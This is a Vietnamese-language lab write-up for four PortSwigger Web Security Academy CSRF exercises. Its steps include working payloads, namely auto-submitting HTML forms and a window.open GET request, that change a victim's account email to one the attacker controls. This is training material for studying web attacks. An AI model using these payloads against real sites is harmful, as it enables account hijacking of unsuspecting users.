### 1.CSRF vulnerability with no defenses

- Mô tả: Ứng dụng cung cấp chức năng cho người dùng thay đổi email qua endpoint: POST /my-account/change-email. Khi người dùng gửi request thay đổi email, server không triển khai bất kỳ biện pháp bảo vệ CSRF nào. Điều này cho phép attacker tạo một trang độc hại chứa form tự submit để ép trình duyệt nạn nhân gửi yêu cầu đổi email mà không cần thao tác. Cần tạo một trang HTML độc hại (host trên Exploit Server), sau đó nhấn Deliver exploit to victim. Khi bot truy cập, trình duyệt tự động submit form, gửi request đổi email đến server

- POC:
1. Mở lab và đăng nhập tài khoản wiener:peter, sau đó thử đổi gmail

<img width="798" height="399" alt="image" src="https://github.com/user-attachments/assets/ed933cce-8b9f-48c6-9fd3-9a5420b074de" />

<img width="751" height="357" alt="image" src="https://github.com/user-attachments/assets/fb0e73f9-adc6-4fed-8dfc-70a6fe06e3c4" />

2. Truy cập Exploit Server và tạo payload(payload là một POST form auto-submit)

````
<form id="autosubmit" action="https://0a0400440466dbf580703b40003b000d.web-security-academy.net/my-account/change-email" enctype="text/plain" method="POST">
  <input name="email" type="hidden" value="hwllnah@gmail.com" />
  <input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>
````

<img width="984" height="321" alt="image" src="https://github.com/user-attachments/assets/2778a7a7-0c63-4dda-918c-1b962342d99d" />

3. Gửi exploit đến nạn nhân bằng cách nhấn Deliver exploit to victim

→ Bot (nạn nhân) sẽ truy cập trang

→ Form auto-submit gửi request đổi email.

4. Kết quả

Email của tài khoản bot bị đổi sang hwllnah@gmail.com và Solved lab

### 2.CSRF where token validation depends on request method

- Mô tả: Chức năng thay đổi email của bài lab dễ bị CSRF. Bài lab này cố gắng chặn các cuộc tấn công CSRF, nhưng chỉ áp dụng biện pháp request method nhất định. Sử dụng exploit server để lưu trữ trang HTML sử dụng tấn công CSRF thay đổi địa chỉ email của người xem.

- POC:
1. Mở lab và đăng nhập tài khoản wiener:peter, đổi gmail và bắt request chuyển vào repeater

<img width="844" height="441" alt="image" src="https://github.com/user-attachments/assets/1146e85f-47a0-495b-bf23-befb849ddda5" />

<img width="852" height="404" alt="image" src="https://github.com/user-attachments/assets/0eab7c50-391a-4161-a746-3c0f36f0afda" />

2. Một số ứng dụng xác thực mã thông báo chính xác khi yêu cầu sử dụng phương thức POST nhưng bỏ qua xác thực khi sử dụng phương thức GET. Khi thay đổi POST thành GET và đưa parameter trên URL, server xử lý đúng method mà nó mong muốn, nên đổi được email.

<img width="1064" height="390" alt="image" src="https://github.com/user-attachments/assets/3b5c26ae-cee4-4587-82a5-727ea0970b9a" />

<img width="1174" height="412" alt="image" src="https://github.com/user-attachments/assets/5be9e3ca-5e12-4b30-b50f-56b05f538e3a" />

<img width="865" height="539" alt="image" src="https://github.com/user-attachments/assets/cb7697e5-1503-4e0e-aeac-22fd645befe0" />

3. Mọi URL mà trình duyệt mở bằng window.open() đều tạo request dạng GET, nên payload là:

`<body onload="window.open('https://0a91008c03dc7d2181427fb200250022.web-security-academy.net/my-account/change-email?email=hwllnah@gmail.com')">`

<img width="1297" height="363" alt="image" src="https://github.com/user-attachments/assets/cc71e0aa-62eb-4d61-b98c-ad220ad106a8" />

4. Email của tài khoản bot bị đổi sang hwllnah@gmail.com và Solved lab

<img width="1179" height="196" alt="image" src="https://github.com/user-attachments/assets/43402ec4-ee38-4e57-81bc-e9668d6c3581" />

### 3.CSRF where token validation depends on token being present

- Mô tả: Một số ứng dụng xác thực đúng mã thông báo khi có mã thông báo nhưng bỏ qua bước xác thực nếu mã thông báo bị bỏ sót.Trong bài lab này, attacker có thể xóa toàn bộ tham số chứa mã thông báo (không chỉ giá trị của nó) để bỏ qua xác thực và thực hiện cuộc tấn công CSRF

- POC:
1. Mở lab và đăng nhập tài khoản wiener:peter, đổi gmail và bắt request chuyển vào repeater

<img width="1031" height="603" alt="image" src="https://github.com/user-attachments/assets/3ff95c39-68a9-4e48-9148-ba9b18c69b1f" />

2. Xóa csrf và send request, sẽ đổi gmail của tài khoản wiener

<img width="717" height="351" alt="image" src="https://github.com/user-attachments/assets/64fa2f05-6ad0-495c-aee5-15160873b118" />

<img width="792" height="378" alt="image" src="https://github.com/user-attachments/assets/faffc98f-f43f-466c-994e-99bbb03fc4e3" />

<img width="817" height="380" alt="image" src="https://github.com/user-attachments/assets/8ef3ba6b-1e28-4f0c-9270-38f09b5bad34" />

3. Payload:

<img width="1183" height="365" alt="image" src="https://github.com/user-attachments/assets/ac204124-dcfe-4ef8-87f3-7c4cc458b44e" />

4. Khi nhấn Deliver exploit to victim, bot (trình duyệt giả lập nạn nhân) sẽ: Mở trang HTML → Nó load <body> và <script>.

Trình duyệt tự động submit form như người dùng thật → document.getElementById("x").submit() chạy ngay khi trang load.

Vì server không yêu cầu CSRF token → email của bot sẽ bị đổi.

<img width="944" height="201" alt="image" src="https://github.com/user-attachments/assets/4fe2b149-8f4d-4200-b89a-c88ffbd13fd8" />

### 4.CSRF where token is not tied to user session

- Mô tả: Chức năng thay đổi email của bài lab này dễ bị tấn công CSRF. Bài lab sử dụng mã thông báo để cố gắng ngăn chặn các cuộc tấn công CSRF, nhưng chúng không được tích hợp vào hệ thống xử lý session của trang web.  Sử dụng exploit server để lưu trữ trang HTML sử dụng tấn công CSRF thay đổi địa chỉ email của người xem.

- POC:
1. Mở lab và đăng nhập tài khoản wiener:peter, đổi gmail và chặn request đổi gmail

<img width="795" height="349" alt="image" src="https://github.com/user-attachments/assets/920506b8-e84f-4b14-9902-6ce7bafa49f4" />

2. Copy csrf token và drop request đổi gmail

<img width="1058" height="460" alt="image" src="https://github.com/user-attachments/assets/5b2b0982-31a5-4876-8e20-c899d6d8fb81" />

<img width="847" height="228" alt="image" src="https://github.com/user-attachments/assets/41e3d217-9bd9-4d7d-b15a-b473ca9ba7e1" />

3. Thay csrf token vừa copy vào payload:

````
<html>
<body>
<form action="https://0a9c001803a768c38057c1ce00bd00ff.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hwllnah@gmail.com" />
  <input type="hidden" name="csrf" value="D3kOYWzgitiVQx4O8nBoVECNm2comh1V" />
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>
````

<img width="1152" height="380" alt="image" src="https://github.com/user-attachments/assets/1cb961b1-394c-4d57-ad16-63e3f107dc2f" />

5. Kết quả

<img width="1095" height="179" alt="image" src="https://github.com/user-attachments/assets/d09bd1f6-d931-417a-a24f-1552c08d51ce" />
